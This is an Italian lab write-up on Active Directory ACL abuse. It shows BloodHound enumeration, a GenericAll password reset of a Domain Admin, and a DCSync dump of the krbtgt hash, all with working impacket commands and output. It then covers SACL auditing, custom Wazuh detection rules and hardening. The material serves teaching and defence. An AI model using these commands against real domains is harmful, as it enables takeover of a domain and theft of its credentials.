# 02 — ACL Abuse, BloodHound e DCSync

MITRE ATT&CK: T1069/T1087 (discovery) · T1098/T1222 (abuso DACL) · T1003.006 (DCSync)

Questa parte mostra come basti solo un permesso assegnato male su un oggetto AD per trasformare un utente senza privilegi nel controllore dell'intero dominio, e come un difensore lo può rilevare.

---

## La catena

 Trovo un permesso eccessivo (BloodHound), lo uso per rubare l'identità di un Domain Admin (reset password via GenericAll) e con quell'identità posso controllare l'intero dominio (DCSync del krbtgt).

```
m.rossi (nessun privilegio)
   │  GenericAll su priv.admin   ← la falla
   ▼
priv.admin (Domain Admin)        ← identità rubata via reset password
   │  Replicating Directory Changes
   ▼
krbtgt + intero dominio          ← DCSync: controllo crittografico totale
```

---

## LA VULNERABILITò

Scenario: un utente di supporto ("m.rossi") riceve, per una delega misconfigurata il controllo totale ("GenericAll") su un account membro di DOMAIN ADMINS ("priv.admin").

Creazione del bersaglio privilegiato e assegnazione del permesso (su DC01):

```powershell
# Account bersaglio, membro di Domain Admins (RID 512, indipendente dalla lingua)
$pw = ConvertTo-SecureString "Temp#Start2026!" -AsPlainText -Force
New-ADUser -Name "Priv Admin" -SamAccountName "priv.admin" -UserPrincipalName "priv.admin@lab.local" `
  -Path "OU=LabUsers,DC=lab,DC=local" -AccountPassword $pw -Enabled $true
$da = (Get-ADDomain).DomainSID.Value + "-512"
Add-ADGroupMember -Identity $da -Members priv.admin

# La vulnerabilità: m.rossi ottiene GenericAll (GA) su priv.admin
dsacls "CN=Priv Admin,OU=LabUsers,DC=lab,DC=local" /G "LAB\m.rossi:GA"
```

Verifica che l'ACE sia scritto:

```powershell
dsacls "CN=Priv Admin,OU=LabUsers,DC=lab,DC=local" | findstr /i "m.rossi"
# -> Consenti LAB\m.rossi   FULL CONTROL
```

![Permesso GenericAll assegnato a m.rossi](screenshots/01-falla-dsacls.png)

---

## ENUMERAZIONE

Da Kali, come utente senza privilegi, raccolgo la mappa del dominio via LDAP:

```bash
bloodhound-ce-python -u m.rossi -p 'Autunno2026!' -d lab.local -dc dc01.lab.local -ns 192.168.56.10 -c All --zip
```

Carico lo zip in BloodHound CE (File Ingest e poi Upload), "m.rossi" come Owned e lancio il Pathfinding verso "DOMAIN ADMINS". con BloodHound come un utente possa trovare una via diretta al controllo del dominio tramite l'edge GenericAll.

Su bloodHound: path M.ROSSI, poi GenericAll, priv.admin, Domain Admins (screenshots/02-bloodhound-path.png)

PICCOLA NOTA: >>> la raccolta di BloodHound genera un grande volume anomalo di query LDAP in pochi secondi — un indicatore su cui un difensore può costruire detection. In un engagement reale si userebbe una raccolta mirata (`-c ACL,ObjectProps`) invece di `-c All` per ridurre il rumore.

---

## SFRUTTAMENTO EFFETTIVO

### Verifica del permesso (lato attaccante)

Prima di agire, confermo i diritti che ho sul target:

```bash
impacket-dacledit -action read -principal m.rossi -target priv.admin 'lab.local/m.rossi:Autunno2026!' -dc-ip 192.168.56.10
# -> Access mask: FullControl (0xf01ff)  Trustee: m.rossi
```

[dacledit: FullControl di m.rossi su priv.admin](screenshots/03-dacledit-fullcontrol.png)

### Abuso del GenericAll con reset della password

Il GenericAll consente di resettare la password del target senza conoscerla**. Dopo il reset, conosco le credenziali di un Domain Admin:

```bash
impacket-changepasswd 'lab.local/priv.admin@192.168.56.10' -reset -altuser 'lab.local/m.rossi' -altpass 'Autunno2026!' -newpass 'LongPassw0rd!2026#Lab'
# -> Password was changed successfully.
```

[Reset password riuscito](screenshots/04-reset-success.png)

Da notare però che il reset forzato ("-reset") invalida le chiavi Kerberos del target finché non viene fatto un cambio password "classico", il che rende instabili gli accessi via Kerberos dopo l'attacco, particolare piuttosto rumoroso, utile anche come indicatore difensivo.

### PROVA DEL CONTROLLO, DCSYNC DEL KRBTGT

Ora sono quindi "priv.admin",il Domain Admin, per dimostrare la compromissione farò il DCSync: chiedo al Domain Controller di replicarmi gli hash, incluso quello del **krbtgt** (la chiave master del dominio):

```bash
impacket-secretsdump 'lab.local/priv.admin:LongPassw0rd!2026#Lab'@192.168.56.10 -just-dc-user krbtgt
# -> krbtgt:502:...:f1ffeefa8fa7f8557335efc881f0cd80:::
# -> [*] Kerberos keys grabbed
```

[DCSync: hash krbtgt estratto](screenshots/05-dcsync-krbtgt.png)

---

## DETECTION

### PREREQUISITI

Per far si che gli eventi di accesso agli oggetti AD (4662, 5136) vengano generati, ho scoperto NON è sufficiente attivare la sottocategoria di audit, serve anche una **SACL** sull'oggetto da sorvegliare. Il primo è l'audit generale acceso e il secondo è come fosse l'oggetto spuntato come da auditare.

ALTRA NOTA:>>> il  DCSync accede alla radice del dominio, non all'OU, la SACL applicandola sull'OU "LabUsers" non copriva il DCSync e l'attacco va inosservato, bisognava quindi aggiungere la SACL sui diritti di replica alla radice del dominio:

```powershell
$acl = Get-Acl "AD:\DC=lab,DC=local" -Audit
$everyone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
$guid = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # Replicating Directory Changes All
$rule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule($everyone,[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,[System.Security.AccessControl.AuditFlags]::Success,$guid)
$acl.AddAuditRule($rule)
Set-Acl "AD:\DC=lab,DC=local" -AclObject $acl
gpupdate /force
```

l'audit "acceso" quindi senza la SACL giusta sull'oggetto dominio fa passare attacchi gravi coome il DCSync senza neanche registrarli. 

Idem per il 5136 (modifica DACL), che vuole sottocategoria Directory Service Changes PIù SACL sull'OU e "gpupdate /force".

Una cosa, gli eventi arrivano al SIEM, ma:
- 4724 (reset) e 5136 (modifica DACL) hanno già un rule.level assegnato da Wazuh.
- 4662 (il DCSync) è rumoroso con migliaia al giorno, Wazuh di default non lo allerta.


### REGOLE DI DETECTIO CUSTOM

Ho scritto tre regole in `/var/ossec/etc/rules/local_rules.xml` sul server Wazuh, la regola DCSync però scatta solo sul 4662 che contiene il GUID di replica, ignorando tutto il rumore.

```xml
<rule id="100100" level="14">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4662$</field>
  <field name="win.eventdata.properties">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</field>
  <description>DCSync: richiesta di replica delle credenziali di dominio (potenziale dump NTDS/krbtgt)</description>
  <mitre><id>T1003.006</id></mitre>
</rule>

<rule id="100101" level="12">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4724$</field>
  <description>Reset password di un account tramite privilegio (possibile abuso GenericAll/ACL)</description>
  <mitre><id>T1098</id></mitre>
</rule>

<rule id="100102" level="10">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^5136$</field>
  <description>Modifica DACL su oggetto Active Directory (possibile ACL abuse / delega sospetta)</description>
  <mitre><id>T1222.001</id></mitre>
</rule>
```

per applicare:
```bash
sudo systemctl restart wazuh-manager
```


Ora filtro la dashboard per gravità ("rule.level:>=10", Last 15 minutes), l'intera catena d'attacco emerge in cima, con nomi leggibili e livelli di priorità.

[Detection: i 3 alert custom ordinati per gravità](screenshots/06-detection-insieme.png)


---

## HARDENING FINALE E RE-TESTING

La contromisura mira alla causa: il permesso eccessivo. Rimuovo il GenericAll di m.rossi:

```powershell
dsacls "CN=Priv Admin,OU=LabUsers,DC=lab,DC=local" /R "LAB\m.rossi"
dsacls "CN=Priv Admin,OU=LabUsers,DC=lab,DC=local" | findstr /i "m.rossi"
```

Re-test: lo stesso identico attacco ora fallisce.

```bash
# L'ACE non c'è più
impacket-dacledit -action read -principal m.rossi -target priv.admin 'lab.local/m.rossi:Autunno2026!' -dc-ip 192.168.56.10
# -> (nessun risultato per il SID di m.rossi)

# Il reset viene rifiutato
impacket-changepasswd 'lab.local/priv.admin@192.168.56.10' -reset -altuser 'lab.local/m.rossi' -altpass 'Autunno2026!' -newpass 'Test123!'
# -> [-] m.rossi is not allowed to set the password of the target
```

[Re-test: l'attacco fallisce dopo l'hardening](screenshots/08-retest-fallito.png)


## CONCLUSIONE

- Principio del Least Privilege : le deleghe vanno fatte con parsimonia e riviste spesso. 
- Audit per la detection: abilitare Directory Service Access/Changes e le SACL sugli oggetti critici (inclusa la radice del dominio per il DCSync).

---

## Indice screenshot

| File | Contenuto |
|------|-----------|
| `01-falla-dsacls.png` | GenericAll assegnato a m.rossi (dsacls findstr) |
| `02-bloodhound-path.png` | Path di escalation in BloodHound |
| `03-dacledit-fullcontrol.png` | Verifica FullControl via dacledit |
| `04-reset-success.png` | Reset password riuscito |
| `05-dcsync-krbtgt.png` | DCSync, hash krbtgt estratto |
| `06-detection-insieme.png` | I 3 alert custom ordinati per gravità |
| `07-detection-dettaglio.png` | Dettaglio alert DCSync + MITRE |
| `08-retest-fallito.png` | Re-test: attacco bloccato dopo hardening |
